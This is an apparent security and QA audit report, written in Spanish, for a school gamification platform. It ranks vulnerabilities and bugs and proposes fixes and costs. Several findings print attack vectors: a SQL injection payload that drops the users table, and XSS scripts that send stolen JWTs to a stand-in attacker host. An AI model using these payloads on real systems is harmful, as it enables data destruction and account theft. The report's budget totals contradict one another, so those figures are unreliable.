# ISSUES CRÍTICOS - GAMILITPLATFORM
## 66+ Issues Identificados y Priorizados

**Versión:** 2.0
**Fecha:** 27 de Octubre, 2025
**Fuente:** Ciclo 3 - Análisis Final Consolidado

---

## RESUMEN EJECUTIVO

### Distribución de Issues

| Prioridad | Cantidad | Bloqueante | Sprint | Costo |
|-----------|----------|------------|--------|-------|
| **P0 - CRÍTICO** | 10 | ✋ Sí | 0 | $6,725 |
| **P1 - ALTO** | 18 | ⚠️ Parcial | 1-2 | $22,000 |
| **P2 - MEDIO** | 28 | ❌ No | 3-6 | $30,000 |
| **P3 - BACKLOG** | 10+ | ❌ No | Post | TBD |
| **TOTAL** | **66+** | - | **7** | **$58,725** |

### Estado de Resolución

```
┌─────────────────────────────────────┐
│ ISSUES TOTALES:      66             │
├─────────────────────────────────────┤
│ Resueltos:           0  (0%)   🔴  │
│ En progreso:         0  (0%)   ⚠️  │
│ Pendientes:          66 (100%) ❌  │
└─────────────────────────────────────┘
```

---

## ISSUES P0 - BLOQUEADORES CRÍTICOS

### ISSUE-P0-001: Tablas Social Features Faltantes
**Categoría:** Base de Datos
**Severidad:** 🔴 CRÍTICO - Bloqueador total
**CVSS:** N/A (funcionalidad)
**Estado:** ❌ NO RESUELTO

**Descripción:**
Las tablas `friendships`, `team_members` y `team_challenges` NO existen en la base de datos, causando que el 100% del módulo social esté roto.

**Impacto:**
- 25+ endpoints retornan error 500
- 0% de funcionalidad social disponible
- Retención estimada -60%
- Engagement reducido significativamente

**Componentes afectados:**
- `/backend/src/modules/social/friends/` (100% roto)
- `/backend/src/modules/social/teams/` (100% roto)
- `/backend/src/modules/social/guilds/` (100% roto)

**Endpoints afectados:**
```
GET  /api/social/friends              → 500 Error
POST /api/social/friends/request      → 500 Error
PUT  /api/social/friends/accept/:id   → 500 Error
GET  /api/social/teams                → 500 Error
POST /api/social/teams/create         → 500 Error
... (20+ endpoints más)
```

**Solución:**
Ejecutar script SQL de creación de tablas:
```sql
-- /database/patches/001-social-tables.sql
CREATE TABLE social_features.friendships (...);
CREATE TABLE social_features.team_members (...);
CREATE TABLE social_features.team_challenges (...);
```

**Esfuerzo:** 0.5 horas
**Costo:** $75
**Sprint:** 0
**Owner:** Backend Dev

**Criterios de aceptación:**
- [ ] Tablas creadas con todas las constraints
- [ ] Índices de performance creados
- [ ] Permisos para `glit_user` otorgados
- [ ] Endpoints retornan 200 OK
- [ ] Tests de integración pasan

---

### ISSUE-P0-002: SQL Injection en RLS Middleware
**Categoría:** Seguridad
**Severidad:** 🔴 CRÍTICO
**CVSS:** 8.2 (HIGH)
**CWE:** CWE-89 (SQL Injection)
**Estado:** ❌ NO RESUELTO

**Descripción:**
El middleware de Row-Level Security usa string interpolation en queries SQL, permitiendo potencial SQL injection.

**Código vulnerable:**
```typescript
// /backend/src/middleware/rls.middleware.ts:43-47
await client.query(`SET LOCAL app.user_id = '${userId}'`);
await client.query(`SET LOCAL app.tenant_id = '${tenantId}'`);
```

**Vector de ataque:**
```javascript
userId = "'; DROP TABLE users; --"
// Query resultante:
SET LOCAL app.user_id = ''; DROP TABLE users; --'
```

**Impacto:**
- Acceso no autorizado a toda la base de datos
- Potencial eliminación de datos
- Compromiso de 500+ cuentas de usuarios
- Exposición de PII (Personally Identifiable Information)
- Multas GDPR/LGPD: $50,000-$500,000

**OWASP Top 10:** A03:2021 - Injection

**Solución:**
Usar parametrización de queries:
```typescript
await client.query('SET LOCAL app.user_id = $1', [userId]);
await client.query('SET LOCAL app.tenant_id = $1', [tenantId]);
```

**Archivos afectados:**
- `/backend/src/middleware/rls.middleware.ts` (líneas 43-47, 111-114)

**Esfuerzo:** 2 horas
**Costo:** $300
**Sprint:** 0
**Owner:** Backend Dev

**Criterios de aceptación:**
- [ ] Queries usan parametrización ($1, $2)
- [ ] Tests de SQL injection pasan (10+ casos)
- [ ] Security scan aprobado
- [ ] Code review de seguridad completado
- [ ] No regresiones en funcionalidad RLS

**ROI:** 5,000% (evita $200,000 en pérdidas)

---

### ISSUE-P0-003: IDOR en 15+ Endpoints
**Categoría:** Seguridad
**Severidad:** 🔴 CRÍTICO
**CVSS:** 7.8 (HIGH)
**CWE:** CWE-639 (Insecure Direct Object Reference)
**Estado:** ❌ NO RESUELTO

**Descripción:**
15+ endpoints permiten acceso a datos de otros usuarios sin validación de ownership, violando privacidad.

**Ejemplo de ataque:**
```bash
# Usuario A (id: user-123) puede ver datos de Usuario B
GET /api/progress/user/user-456
Authorization: Bearer <token-user-A>

# Response: 200 OK con datos privados de user-456
```

**Endpoints vulnerables (15):**
1. `GET /api/progress/user/:userId`
2. `POST /api/progress/update/:userId`
3. `GET /api/gamification/stats/:userId`
4. `GET /api/gamification/achievements/:userId`
5. `GET /api/educational/submissions/:submissionId`
6. `GET /api/teacher/students/:studentId`
7. `GET /api/teacher/student-progress/:studentId`
8. `POST /api/teacher/assign-exercise/:studentId`
9. `GET /api/social/profile/:userId`
10. `GET /api/missions/user/:userId`
11. `GET /api/notifications/user/:userId`
12. `GET /api/streaks/user/:userId`
13. `GET /api/ranks/user/:userId`
14. `POST /api/gamification/award-coins/:userId`
15. `GET /api/admin/user-analytics/:userId`

**Impacto:**
- Violación masiva de privacidad
- Usuario A puede ver progreso de Usuario B
- Profesores pueden acceder a estudiantes de otros
- Exposición de datos sensibles (calificaciones, submissions)
- GDPR/LGPD non-compliance

**OWASP Top 10:** A01:2021 - Broken Access Control

**Solución:**
Implementar middleware de ownership:
```typescript
// /backend/src/middleware/ownership.middleware.ts
router.get('/user/:userId',
  authenticateJWT,
  checkOwnership({
    paramName: 'userId',
    allowSelf: true,
    allowRoles: ['teacher', 'admin']
  }),
  controller.getUserProgress
);
```

**Esfuerzo:** 8 horas
**Costo:** $1,200
**Sprint:** 0
**Owner:** Backend Dev

**Criterios de aceptación:**
- [ ] Middleware de ownership implementado
- [ ] 15 endpoints protegidos
- [ ] Tests de IDOR pasan (20+ casos)
- [ ] Logs de intentos no autorizados
- [ ] No regresiones funcionales

**Compliance:** GDPR Art. 5(1)(f), LGPD Art. 6

---

### ISSUE-P0-004: Maya Ranks Case Mismatch
**Categoría:** Lógica de Negocio
**Severidad:** 🔴 CRÍTICO
**CVSS:** N/A (funcionalidad)
**Estado:** ❌ NO RESUELTO

**Descripción:**
Inconsistencia de case (mayúsculas/minúsculas) entre backend y frontend causa que comparaciones fallen y multiplicadores no se apliquen.

**Problema:**
```typescript
// Backend retorna:
{ currentRank: 'nacom' }  // lowercase

// Frontend espera:
type MayaRank = 'Ajaw' | 'Nacom' | ...  // UPPERCASE

// Comparación falla:
if (rank === 'Ajaw') { ... }  // FALSE (porque es 'nacom')
```

**Impacto:**
- Sistema de progresión roto
- Multiplicadores de XP no se aplican (0% bonus)
- Estudiantes no avanzan de módulo correctamente
- Engagement -40%
- Confusión en UI (muestra rank incorrecto)

**Componentes afectados:**
- `/backend/src/modules/gamification/ranks/ranks.service.ts`
- `/frontend/src/types/gamification.types.ts`
- `/frontend/src/hooks/useRankMultiplier.ts`
- `/frontend/src/components/RankDisplay.tsx`

**Solución (Opción A - Recomendada):**
Backend retorna UPPERCASE:
```typescript
// ranks.service.ts
return {
  currentRank: row.current_rank.toUpperCase() as MayaRank,
  ...
};
```

**Esfuerzo:** 4 horas
**Costo:** $600
**Sprint:** 0
**Owner:** Fullstack Dev

**Criterios de aceptación:**
- [ ] Backend retorna ranks en UPPERCASE
- [ ] Frontend recibe correctamente
- [ ] Multiplicadores se aplican
- [ ] UI muestra ranks correctamente
- [ ] Tests pasan (backend + frontend)

---

### ISSUE-P0-005: JWT Tokens Sin Hash en DB
**Categoría:** Seguridad
**Severidad:** 🔴 CRÍTICO
**CVSS:** 8.1 (HIGH)
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)
**Estado:** ❌ NO RESUELTO

**Descripción:**
Los JWT tokens se almacenan en texto plano en la tabla `user_sessions`, exponiendo todas las sesiones activas en caso de breach de base de datos.

**Código actual:**
```typescript
// auth.service.ts
await pool.query(
  `INSERT INTO user_sessions (user_id, token, expires_at)
   VALUES ($1, $2, NOW() + INTERVAL '7 days')`,
  [userId, token]  // Token en texto plano!
);
```

**Impacto:**
- DB comprometida = 500+ tokens expuestos
- Atacante puede suplantar TODAS las cuentas activas
- Session hijacking masivo
- Pérdida total de confianza de usuarios

**Escenario de ataque:**
```
1. Atacante obtiene acceso a DB (SQL injection, insider, backup leaked)
2. SELECT token FROM user_sessions WHERE expires_at > NOW()
3. Atacante tiene 500 tokens JWT válidos
4. Atacante accede a 500 cuentas simultáneamente
```

**OWASP Top 10:** A02:2021 - Cryptographic Failures

**Solución:**
Hashear tokens antes de almacenar:
```typescript
import * as crypto from 'crypto';

function hashToken(token: string): string {
  return crypto.createHash('sha256').update(token).digest('hex');
}

// Almacenar hash
await pool.query(
  `INSERT INTO user_sessions (user_id, token_hash, expires_at)
   VALUES ($1, $2, NOW() + INTERVAL '7 days')`,
  [userId, hashToken(token)]
);

// Validar con hash
const tokenHash = hashToken(token);
const result = await pool.query(
  `SELECT user_id FROM user_sessions
   WHERE token_hash = $1 AND expires_at > NOW()`,
  [tokenHash]
);
```

**Esfuerzo:** 8 horas
**Costo:** $1,200
**Sprint:** 0
**Owner:** Backend Dev

**Nota importante:**
- Invalidará todas las sesiones activas
- Comunicar a usuarios: "Security upgrade - please re-login"

**Criterios de aceptación:**
- [ ] Tokens hasheados con SHA-256
- [ ] Validación usa hash comparison
- [ ] Migration ejecutada sin errores
- [ ] Usuarios pueden re-autenticarse
- [ ] Tests de sesiones pasan
- [ ] No se almacenan tokens en plaintext

**Compliance:** GDPR Art. 32, LGPD Art. 46

---

### ISSUE-P0-006: Email Verification OFF
**Categoría:** Seguridad / Producto
**Severidad:** 🔴 CRÍTICO (decisión)
**CVSS:** 6.5 (MEDIUM)
**CWE:** CWE-284 (Improper Access Control)
**Estado:** ⚠️ DECISIÓN PENDIENTE

**Descripción:**
Todos los usuarios son marcados como `emailVerified: true` automáticamente al registrarse, sin verificación real.

**Código actual:**
```typescript
// auth.controller.ts
const user = await authService.register({
  email,
  password,
  emailVerified: true  // ⚠️ Siempre true!
});
```

**Impacto:**
- Registros spam sin control
- Bots pueden crear miles de cuentas
- No hay forma de recuperar cuentas (email no verificado)
- No se puede enviar comunicaciones importantes
- Calidad de usuarios baja

**Escenarios problemáticos:**
1. **Usuario escribe mal su email:** No puede recuperar cuenta
2. **Bot registration:** 1,000+ cuentas fake en 1 día
3. **Email campaigns:** 40% bounce rate (emails falsos)
4. **Support:** No podemos contactar a usuarios

**Opciones de solución:**

**Opción A: Email Verification Completa** (RECOMENDADO)
- Esfuerzo: 40 horas
- Costo: $6,000
- Sprint: 1
- Features: Email flow completo, reminders, auto-delete

**Opción B: Soft Verification**
- Esfuerzo: 20 horas
- Costo: $3,000
- Sprint: 0
- Features: Funciones limitadas sin verificar

**Opción C: CAPTCHA + Rate Limiting**
- Esfuerzo: 8 horas
- Costo: $1,200
- Sprint: 0
- Features: Solo anti-bot, no verificación

**Requisitos de decisión:**
- [ ] Meeting 30min con stakeholders
- [ ] Decisión documentada
- [ ] Plan de implementación creado
- [ ] Tasks agregadas al sprint

**Esfuerzo (decisión):** 2 horas
**Sprint:** 0
**Owner:** Product Owner + Tech Lead

---

### ISSUE-P0-007: XSS en Content Editor
**Categoría:** Seguridad
**Severidad:** 🔴 CRÍTICO
**CVSS:** 6.9 (MEDIUM)
**CWE:** CWE-79 (Cross-Site Scripting)
**Estado:** ❌ NO RESUELTO

**Descripción:**
El componente `ExerciseContentEditor` usa `dangerouslySetInnerHTML` sin sanitización, permitiendo ataques XSS.

**Código vulnerable:**
```tsx
// ExerciseContentEditor.tsx:131
<div dangerouslySetInnerHTML={{ __html: content }} />
```

**Vector de ataque:**
```javascript
// Profesor crea ejercicio con contenido malicioso:
const content = `
  <p>Resuelve el crucigrama</p>
  <script>
    // Robar token JWT
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        token: localStorage.getItem('jwt')
      })
    });
  </script>
`;

// Estudiante abre ejercicio → script se ejecuta → token robado
```

**Impacto:**
- Robo de sesiones (JWT tokens)
- Robo de datos sensibles (localStorage, cookies)
- Defacement de contenido
- Redirección a sitios maliciosos
- Inyección de malware

**OWASP Top 10:** A03:2021 - Injection (XSS)

**Solución:**
Sanitizar con DOMPurify:
```tsx
import DOMPurify from 'dompurify';

const sanitizedContent = DOMPurify.sanitize(content, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'ul', 'ol', 'li', 'a'],
  ALLOWED_ATTR: ['href', 'title', 'class'],
  ALLOW_DATA_ATTR: false
});

<div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
```

**Archivos afectados:**
- `/frontend/src/components/ExerciseContentEditor.tsx`
- Potencialmente 10+ componentes más con dangerouslySetInnerHTML

**Esfuerzo:** 4 horas
**Costo:** $600
**Sprint:** 0
**Owner:** Frontend Dev

**Criterios de aceptación:**
- [ ] DOMPurify instalado y configurado
- [ ] Todos los dangerouslySetInnerHTML sanitizados
- [ ] Tests de XSS pasan (10+ casos)
- [ ] No rompe contenido legítimo
- [ ] Performance aceptable (<50ms)

---

### ISSUE-P0-008: Session Validation Missing
**Categoría:** Seguridad
**Severidad:** 🔴 CRÍTICO
**CVSS:** 7.5 (HIGH)
**CWE:** CWE-613 (Insufficient Session Expiration)
**Estado:** ❌ NO RESUELTO

**Descripción:**
El sistema NO valida sesiones contra la base de datos, permitiendo que tokens revocados sigan funcionando.

**Problema:**
```typescript
// JWT middleware solo valida signature y exp
// NO chequea si la sesión fue revocada en DB

// Escenario:
1. Usuario hace logout → session deleted from DB
2. Token JWT sigue siendo válido (hasta exp)
3. Atacante con el token puede seguir accediendo
```

**Impacto:**
- Logout NO funciona realmente
- Tokens robados no pueden revocarse
- "Logout de todos los dispositivos" inútil
- Sesiones comprometidas permanecen activas

**Solución:**
Validar sesión en DB en cada request:
```typescript
// auth.middleware.ts
async function authenticateJWT(req, res, next) {
  const token = extractToken(req);
  const decoded = jwt.verify(token, SECRET);

  // ✅ Validar contra DB
  const sessionExists = await sessionService.validateSession(token);
  if (!sessionExists) {
    return res.status(401).json({ error: 'Session revoked' });
  }

  req.user = decoded;
  next();
}
```

**Trade-off:**
- Performance: +1 query DB por request
- Mitigación: Cache sessions en Redis (Sprint 3)

**Esfuerzo:** 8 horas
**Costo:** $1,200
**Sprint:** 0
**Owner:** Backend Dev

**Criterios de aceptación:**
- [ ] Middleware valida sesiones en DB
- [ ] Logout revoca sesión efectivamente
- [ ] Tokens revocados retornan 401
- [ ] Performance aceptable (<50ms overhead)
- [ ] Tests de revocación pasan

---

### ISSUE-P0-009: RLS Policies Incomplete
**Categoría:** Seguridad
**Severidad:** 🔴 CRÍTICO
**CVSS:** 7.3 (HIGH)
**CWE:** CWE-284 (Improper Access Control)
**Estado:** ❌ NO RESUELTO

**Descripción:**
Row-Level Security (RLS) policies solo implementadas en 30% de las tablas, permitiendo acceso no autorizado a datos multi-tenant.

**Tablas sin RLS (15):**
- `gamification_system.achievements`
- `gamification_system.badges`
- `gamification_system.leaderboards`
- `educational_content.exercises`
- `educational_content.submissions`
- `social_features.friendships` (tabla no existe)
- `social_features.team_members` (tabla no existe)
- ... (8 más)

**Impacto:**
- Tenant A puede ver datos de Tenant B
- Violación de isolation multi-tenant
- Breach de privacidad entre escuelas
- Non-compliance con contratos

**Solución:**
Implementar RLS policies en todas las tablas:
```sql
-- Ejemplo: leaderboards
ALTER TABLE gamification_system.leaderboards ENABLE ROW LEVEL SECURITY;

CREATE POLICY leaderboards_isolation ON gamification_system.leaderboards
  USING (tenant_id = current_setting('app.tenant_id')::uuid);
```

**Esfuerzo:** 6 horas
**Costo:** $900
**Sprint:** 0
**Owner:** Backend Dev

**Criterios de aceptación:**
- [ ] RLS habilitado en 100% de tablas
- [ ] Policies creadas y testeadas
- [ ] Tenant isolation verificado
- [ ] Performance aceptable

---

### ISSUE-P0-010: Error Handling Exposes Stack Traces
**Categoría:** Seguridad
**Severidad:** ⚠️ ALTO (no bloqueador)
**CVSS:** 5.3 (MEDIUM)
**CWE:** CWE-209 (Information Exposure Through Error Message)
**Estado:** ❌ NO RESUELTO

**Descripción:**
Errores en producción retornan stack traces completos, exponiendo información sensible sobre la arquitectura.

**Ejemplo:**
```json
// Error response en producción:
{
  "error": "Database error",
  "message": "relation \"social_features.friendships\" does not exist",
  "stack": "Error: relation does not exist\n    at Connection.parseE (/app/node_modules/pg/lib/connection.js:673:13)\n    at /app/backend/src/modules/social/friends/friends.service.ts:45:18\n    ...",
  "query": "SELECT * FROM social_features.friendships WHERE user_id = $1"
}
```

**Información expuesta:**
- Estructura de base de datos
- Rutas de archivos internos
- Dependencias y versiones
- Queries SQL

**Impacto:**
- Facilita ataques dirigidos
- Expone arquitectura interna
- OWASP A05:2021 - Security Misconfiguration

**Solución:**
```typescript
// error.middleware.ts
function errorHandler(err, req, res, next) {
  logger.error(err); // Log completo interno

  // Response sanitizado
  if (process.env.NODE_ENV === 'production') {
    res.status(err.status || 500).json({
      error: 'Internal server error',
      message: 'An error occurred. Please contact support.'
      // NO stack, NO query, NO details
    });
  } else {
    // Solo en development
    res.status(err.status || 500).json({
      error: err.name,
      message: err.message,
      stack: err.stack
    });
  }
}
```

**Esfuerzo:** 3 horas
**Costo:** $450
**Sprint:** 0
**Owner:** Backend Dev

---

## ISSUES P1 - ALTA PRIORIDAD

### ISSUE-P1-001: Rate Limiting Missing
**Categoría:** Seguridad
**Severidad:** ⚠️ ALTO
**CVSS:** 7.0 (HIGH)
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
**Estado:** ❌ NO RESUELTO

**Descripción:**
No hay rate limiting en endpoints, permitiendo ataques de fuerza bruta, DDoS y abuse de recursos.

**Endpoints vulnerables:**
- `/api/auth/login` (brute force attacks)
- `/api/auth/register` (spam registrations)
- `/api/auth/forgot-password` (email flooding)
- Todos los API endpoints (DDoS)

**Escenarios de ataque:**
```
1. Brute force login:
   - 10,000 intentos/min en /api/auth/login
   - Adivinar passwords débiles
   - Bloquear cuentas con intentos fallidos

2. Registration spam:
   - 1,000+ cuentas fake/min
   - Saturar base de datos
   - Inflar métricas de usuarios

3. DDoS:
   - 100,000 requests/min a cualquier endpoint
   - Saturar CPU/DB
   - Downtime de servicio
```

**Impacto:**
- Service downtime (disponibilidad)
- Costos de infraestructura inflados
- Cuentas comprometidas (brute force)
- Base de datos saturada (spam)

**OWASP Top 10:** A04:2021 - Insecure Design

**Solución:**
Implementar rate limiter con Redis:
```typescript
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';

const loginLimiter = rateLimit({
  store: new RedisStore({ client: redisClient }),
  windowMs: 15 * 60 * 1000, // 15 min
  max: 10, // 10 intentos por IP
  message: 'Too many login attempts, please try again later'
});

router.post('/api/auth/login', loginLimiter, authController.login);
```

**Configuraciones sugeridas:**
- Login: 10 intentos/15min/IP
- Register: 3 intentos/hora/IP
- API general: 100 req/min/user
- Forgot password: 3 intentos/hora/email

**Esfuerzo:** 8 horas
**Costo:** $1,200
**Sprint:** 1
**Owner:** Backend Dev

**Criterios de aceptación:**
- [ ] Rate limiter implementado con Redis
- [ ] Configuración por endpoint
- [ ] Headers informativos (X-RateLimit-*)
- [ ] Logs de violations
- [ ] Whitelist para IPs internas

---

### ISSUE-P1-002: Password Policy Weak
**Categoría:** Seguridad
**Severidad:** ⚠️ ALTO
**CVSS:** 6.5 (MEDIUM)
**CWE:** CWE-521 (Weak Password Requirements)
**Estado:** ❌ NO RESUELTO

**Descripción:**
La política de contraseñas actual es débil, permitiendo passwords fáciles de adivinar.

**Policy actual:**
```typescript
// Validación actual (débil):
password.length >= 6  // ⚠️ Solo 6 caracteres!
```

**Passwords permitidos actualmente:**
- "123456" ✅ (muy débil)
- "password" ✅ (muy débil)
- "aaaaaa" ✅ (muy débil)
- "qwerty" ✅ (muy débil)

**Impacto:**
- Cuentas fáciles de hackear
- Brute force exitoso en minutos
- Diccionario de passwords comunes funciona

**OWASP Top 10:** A07:2021 - Identification and Authentication Failures

**Solución:**
Implementar policy fuerte:
```typescript
// Nueva policy:
- Mínimo 8 caracteres
- Al menos 1 mayúscula
- Al menos 1 minúscula
- Al menos 1 número
- Opcional: 1 símbolo especial
- Validar contra diccionario de passwords comunes (top 10,000)
```

**Frontend:**
```tsx
<PasswordStrengthMeter password={password} />
// Muestra: Débil | Media | Fuerte | Muy Fuerte
```

**Esfuerzo:** 7 horas
**Costo:** $1,050
**Sprint:** 1
**Owner:** Fullstack Dev

**Criterios de aceptación:**
- [ ] Nueva policy implementada (backend + frontend)
- [ ] Validación contra diccionario de passwords
- [ ] Password strength meter en UI
- [ ] Mensajes de error claros
- [ ] Tests de validación pasan

---

### ISSUE-P1-003: JWT in localStorage (XSS Risk)
**Categoría:** Seguridad
**Severidad:** ⚠️ ALTO
**CVSS:** 7.2 (HIGH)
**CWE:** CWE-922 (Insecure Storage of Sensitive Information)
**Estado:** ❌ NO RESUELTO

**Descripción:**
Los tokens JWT se almacenan en `localStorage`, haciéndolos vulnerables a robo vía XSS.

**Código actual:**
```typescript
// auth.service.ts (frontend)
localStorage.setItem('jwt', token);  // ⚠️ Vulnerable a XSS!
```

**Vector de ataque:**
```javascript
// Si existe ANY XSS vulnerability:
<script>
  const token = localStorage.getItem('jwt');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: token
  });
</script>
```

**Impacto:**
- Cualquier XSS → robo de token
- Session hijacking
- Acceso no autorizado prolongado

**OWASP Top 10:** A02:2021 - Cryptographic Failures

**Solución:**
Migrar a httpOnly cookies:
```typescript
// Backend:
res.cookie('jwt', token, {
  httpOnly: true,    // No accesible desde JavaScript
  secure: true,      // Solo HTTPS
  sameSite: 'strict', // Anti-CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 días
});

// Frontend:
// No necesita localStorage!
// Cookie se envía automáticamente
```

**Trade-offs:**
- Requiere backend support para cookies
- Frontend debe manejar CSRF tokens
- Refresh token flow más complejo

**Esfuerzo:** 16 horas
**Costo:** $2,400
**Sprint:** 1
**Owner:** Fullstack Dev

**Criterios de aceptación:**
- [ ] JWT en httpOnly cookies
- [ ] Secure flag en producción
- [ ] SameSite=Strict configurado
- [ ] Refresh token mechanism
- [ ] CSRF protection implementada
- [ ] localStorage.removeItem('jwt') en código

---

### ISSUE-P1-004: CORS Misconfiguration
**Categoría:** Seguridad
**Severidad:** ⚠️ ALTO
**CVSS:** 6.8 (MEDIUM)
**CWE:** CWE-942 (Overly Permissive CORS Policy)
**Estado:** ❌ NO RESUELTO

**Descripción:**
CORS configurado con `origin: '*'`, permitiendo que cualquier sitio acceda al API.

**Configuración actual:**
```typescript
// server.ts
app.use(cors({
  origin: '*',  // ⚠️ Permite CUALQUIER origen!
  credentials: true
}));
```

**Impacto:**
- Sitios maliciosos pueden hacer requests al API
- CSRF attacks facilitados
- Datos sensibles expuestos a origins no confiables

**Solución:**
Whitelist de origins permitidos:
```typescript
const allowedOrigins = [
  'https://glit-platform.com',
  'https://app.glit-platform.com',
  'http://localhost:3000',  // Solo development
  process.env.FRONTEND_URL
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

**Esfuerzo:** 4 horas
**Costo:** $600
**Sprint:** 2
**Owner:** Backend Dev

---

### ISSUE-P1-005: No Security Headers
**Categoría:** Seguridad
**Severidad:** ⚠️ ALTO
**CVSS:** 6.5 (MEDIUM)
**CWE:** CWE-16 (Configuration)
**Estado:** ❌ NO RESUELTO

**Descripción:**
Falta configuración de security headers esenciales (CSP, HSTS, X-Frame-Options, etc.).

**Headers faltantes:**
```
❌ Content-Security-Policy (CSP)
❌ Strict-Transport-Security (HSTS)
❌ X-Frame-Options
❌ X-Content-Type-Options
❌ Referrer-Policy
❌ Permissions-Policy
```

**Impacto:**
- Vulnerable a clickjacking
- Vulnerable a MIME sniffing
- Vulnerable a XSS (sin CSP)
- No forzar HTTPS

**OWASP Top 10:** A05:2021 - Security Misconfiguration

**Solución:**
Implementar helmet.js:
```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],  // Adjust as needed
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://api.glit-platform.com']
    }
  },
  hsts: {
    maxAge: 31536000,  // 1 año
    includeSubDomains: true,
    preload: true
  },
  frameguard: {
    action: 'deny'  // Prevenir clickjacking
  },
  noSniff: true,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' }
}));
```

**Esfuerzo:** 4 horas
**Costo:** $600
**Sprint:** 2
**Owner:** Backend Dev

---

### ISSUES P1-006 a P1-018 (Resumen)

Por brevedad, listando solo títulos y prioridad:

- **P1-006:** Logs Sin Sanitización (expone PII) - 3h
- **P1-007:** Redis Missing (performance crítico) - 27h
- **P1-008:** DB Connection Pool Pequeño - 7h
- **P1-009:** N+1 Queries en Leaderboards - 6h
- **P1-010:** Bundle Size Excesivo (855 KB) - 13h
- **P1-011:** No Code Splitting - 13h
- **P1-012:** Imágenes No Optimizadas - 7h
- **P1-013:** No Lazy Loading - 8h
- **P1-014:** No Memoization (React) - 10h
- **P1-015:** Audit Logging Incomplete - 20h
- **P1-016:** Backup Strategy Missing - 12h
- **P1-017:** Monitoring/Alerting Missing - 15h
- **P1-018:** JWT Secret Rotation Missing - 8h

**Total P1:** 18 issues, 187 horas, $28,050

---

## ISSUES P2 - MEDIA PRIORIDAD

### Categorías P2 (28 issues)

**Funcionalidad:**
- P2-001: Achievements Auto-Detection (24h)
- P2-002: Missions System (16h)
- P2-003: Educational Validators (40h)
- P2-004: Digital Certificates (15h)
- P2-005: Module Progress Tracking (10h)

**Performance:**
- P2-006: Frontend Optimization Adicional (20h)
- P2-007: DB Query Optimization Avanzada (15h)
- P2-008: CDN Configuration (7h)

**UX/UI:**
- P2-009: Loading States Faltantes (8h)
- P2-010: Error Messages Mejoras (6h)
- P2-011: Responsive Design Gaps (12h)
- P2-012: Accessibility (WCAG 2.1) (25h)

**Teacher Portal:**
- P2-013: Analytics Dashboard Completo (30h)
- P2-014: Bulk Operations (15h)
- P2-015: Export Reports (10h)

**Social:**
- P2-016: Chat Group (Classroom) (15h)
- P2-017: Read Receipts (5h)
- P2-018: Typing Indicators (4h)

**Testing:**
- P2-019: Integration Tests (40h)
- P2-020: E2E Tests (30h)
- P2-021: Load Tests (15h)

**DevOps:**
- P2-022: CI/CD Pipeline Completo (20h)
- P2-023: Auto-deployment (15h)
- P2-024: Rollback Mechanism (10h)

**Documentation:**
- P2-025: API Documentation Completa (15h)
- P2-026: User Guides (20h)
- P2-027: Admin Guides (15h)
- P2-028: Developer Onboarding (12h)

**Total P2:** 28 issues, 503 horas, $75,450

---

## ISSUES P3 - BACKLOG

### Categorías P3 (10+ issues)

- P3-001: OAuth Social Login (25h)
- P3-002: LTI Integration (40h)
- P3-003: SCORM Compliance (60h)
- P3-004: Mobile Apps Nativas (200h)
- P3-005: Adaptive Learning AI (80h)
- P3-006: Analytics ML-based (100h)
- P3-007: Multi-language i18n (80h)
- P3-008: White-label System (120h)
- P3-009: Voice Notes (20h)
- P3-010: Offline Mode (50h)

**Total P3:** 10+ issues, 775+ horas

---

## RESUMEN CONSOLIDADO

### Por Severidad

```
┌──────────────────────────────────────────┐
│ SEVERIDAD        │ Cantidad │ % Total   │
├──────────────────────────────────────────┤
│ 🔴 CRÍTICO (P0)  │    10    │   15%     │
│ ⚠️ ALTO (P1)     │    18    │   27%     │
│ ⚠️ MEDIO (P2)    │    28    │   42%     │
│ ⚠️ BAJO (P3)     │   10+    │   15%     │
└──────────────────────────────────────────┘
```

### Por Categoría

```
Seguridad:        25 issues (38%)
Performance:      12 issues (18%)
Funcionalidad:    15 issues (23%)
UX/UI:            6 issues (9%)
DevOps:           5 issues (8%)
Testing:          3 issues (5%)
```

### Investment Requerido

| Fase | Issues | Horas | Costo | Timeline |
|------|--------|-------|-------|----------|
| **Sprint 0 (P0)** | 10 | 39.5h | $6,725 | 1 semana |
| **Sprint 1-2 (P1)** | 18 | 187h | $28,050 | 2 semanas |
| **Sprint 3-6 (P2)** | 28 | 503h | $75,450 | 4 semanas |
| **Post-launch (P3)** | 10+ | 775h+ | $116,250 | 12+ semanas |
| **TOTAL** | **66+** | **1,504.5h+** | **$226,475** | **19+ semanas** |

### MVP Mínimo (P0 + P1 críticos)
- **Issues:** 15
- **Horas:** 150
- **Costo:** $22,500
- **Timeline:** 3 semanas

---

**Preparado por:** QA Lead / Security Analyst
**Contacto:** [Asignar]
**Última actualización:** 27 de Octubre, 2025
**Versión:** 2.0 - ISSUES CONSOLIDADOS
